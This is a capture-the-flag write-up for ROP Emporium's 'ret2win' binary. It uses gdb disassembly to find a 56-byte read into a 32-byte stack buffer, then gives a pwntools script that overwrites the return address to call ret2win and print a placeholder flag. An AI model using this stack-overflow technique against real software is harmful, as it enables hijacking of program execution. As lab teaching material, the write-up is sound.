# Challenge 1: ret2win

https://ropemporium.com/challenge/ret2win.html

In this challenge, the objective is to call the function ret2win by overwriting a saved return address on the stack. To understand this challenge, let’s first look at gdb.

Once we open gdb, running `disassemble` shows us the following assembly code for the function `main`:

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x400808
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x400820
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400828
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret    
End of assembler dump.
```

Immediately, we notice something interesting. Near the end of the program, the function `pwnme` is called through the assembly `call   0x4006e8 <pwnme>`. The part `<pwnme>` isn’t actually assembly but instead is put by gdb to help us understand the function being called. This is telling us that at the memory address `0x4006e8`, the function `pwnme` is being called.

Next, let’s show the assembly code for `pwnme`. 

```
(gdb) disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
--Type <RET> for more, q to quit, c to continue without paging--
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave  
   0x0000000000400755 <+109>:	ret    
End of assembler dump.
(gdb)
```

Near the beginning of the function, we see the assembly `lea rax,[rbp-0x20]`. This loads the effective address (hence the name lea - load effective address) of the register `rbp`, subtracts 32 bytes (0x20 is 32 in decimal), and puts the resulting address in the register `rax`. This means that the registers rax and rbp are 32 bytes apart. This means the address in `rax` marks the start of a *buffer*, a chunk of memory used to temporarily store data. The length of the buffer is 32 bytes long as the addresses marking the start and end of the buffer are separated by 32 bytes.

Then, further in the disassembly, we see the following assembly. Note that I removed the memory addresses showing where the instructions are in memory for clarity.

```nasm
mov    edx,0x38
mov    rsi,rax
mov    edi,0x0
call   0x400590 <read@plt>
```

The call instruction in assembly performs a function call. To understand what is happening here, it’s first helpful we understand the procedural linkage table, also known as the PLT. The PLT is a way to link functions from shared libraries into the program. In this case, the read function, a function from the C standard library, also known as libc, is being called. The address `0x400590` is the location of the read function within the PLT, allowing the external read function to be called by using the call instruction. The read function, also known as a syscall, takes three arguments, those arguments being a file descriptor specifying where to read from, a buffer to put the bytes read in, and an amount of bytes to read. By setting the file descriptor to zero through moving 0x0 (0 in hex and thus 0 in decimal) into the `edi` register, we tell the system to read from user input, also known as standard input or stdin. Since we move the address in the register `rax` to the register `rsi`, which is taken in as the second argument to the read syscall, we tell the system to place the data read into the buffer that was created earlier through `lea rax,[rbp-0x20]`. However, looking further, we notice that 0x38 (56) bytes are being read into the buffer, while the buffer can only store 0x20 (32) bytes!.

So, what happens when we put *more* than 32 bytes into the buffer? First, we come across the base pointer, stored in the register `rbp`. As mentioned earlier, this register marked the end of the buffer. However, if we go past `rbp`, we come across what’s known as the return address. The return address is the address the program jumps to after a function call completes. In the case of this program, the return address is the next instruction in main after the function pwnme finishes. However, this means that if we can change the return address, we can change the execution of the program.

Since the register `rbp` is a 64 bit register, it has a size of 8 bytes. The return address following the register also has a size of 8 bytes as it’s on a 64 bit system. So, to exploit the vulnerability, we need to input 40 (32 + 8) bytes into the program, then input the return address of the function ret2win, which will print the flag for us. This overflow *both* the buffer and the base pointer, allowing us to directly change the return address to wherever we want in the program.

A straightforward way to implement this is through python’s pwntools library. My solve script is below.

```python
from pwn import *

p = process("./ret2win", stdout=PIPE, stderr=PIPE)

# Create the payload
payload = b"A" * 32
payload += b"B" * 8
payload += p64(0x400756)

# Send the payload to the binary
p.sendline(payload)

# Get the output
p.interactive()
```

While we could have simplified the payload creation through the line `payload = b"A" * 40 + p64(0x400756)`, splitting the payload into multiple lines makes it more clear what the components of the payload are.

Upon running the script, we get the flag!

```
root@ubuntu:/home/c-bass/pwn/ropemporium/ret2win# python3 solve.py
[+] Starting local process './ret2win': pid 109275
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```